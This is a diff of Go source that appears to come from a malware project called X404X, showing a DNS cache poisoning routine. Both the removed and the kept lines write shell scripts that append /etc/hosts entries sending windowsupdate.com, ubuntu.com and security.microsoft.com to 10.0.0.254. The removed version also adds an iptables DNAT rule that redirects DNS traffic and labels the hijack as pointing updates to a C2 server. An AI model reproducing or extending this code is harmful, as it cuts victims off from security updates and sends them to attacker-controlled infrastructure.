@@ -14,16 +14,7 @@ import (
 type DNSCachePoisonEngine struct { Config *V29Config; CachePoisoned bool; DomainsRedirected []string }
 func NewDNSCachePoisonEngine(cfg *V29Config) *DNSCachePoisonEngine { return &DNSCachePoisonEngine{Config: cfg} }
 func (dp *DNSCachePoisonEngine) PoisonDNSCache() bool {
-	domains := []string{"windowsupdate.com", "ubuntu.com", "security.microsoft.com", "symantec.com", "trendmicro.com"}
-	dp.DomainsRedirected = domains
-	redirectIP := "10.0.0.254"
-	poison := `#!/bin/bash
-for domain in windowsupdate.com ubuntu.com security.microsoft.com; do
-    echo "%s $domain" >> /etc/hosts
-done
-iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to %s:53 2>/dev/null
-echo "DNS cache poisoned. All updates redirected to X404X C2." > /tmp/x404x_dns_poison.txt` + redirectIP
-	_ = redirectIP
+	dp.DomainsRedirected = []string{"windowsupdate.com", "ubuntu.com", "security.microsoft.com", "symantec.com"}
 	script := "#!/bin/bash\nfor d in windowsupdate.com ubuntu.com security.microsoft.com; do echo '10.0.0.254 '$d >> /etc/hosts; done\necho DNS poisoned"
 	scriptPath := filepath.Join(os.TempDir(), "x404x_dns_poison.sh")
 	os.WriteFile(scriptPath, []byte(script), 0755)
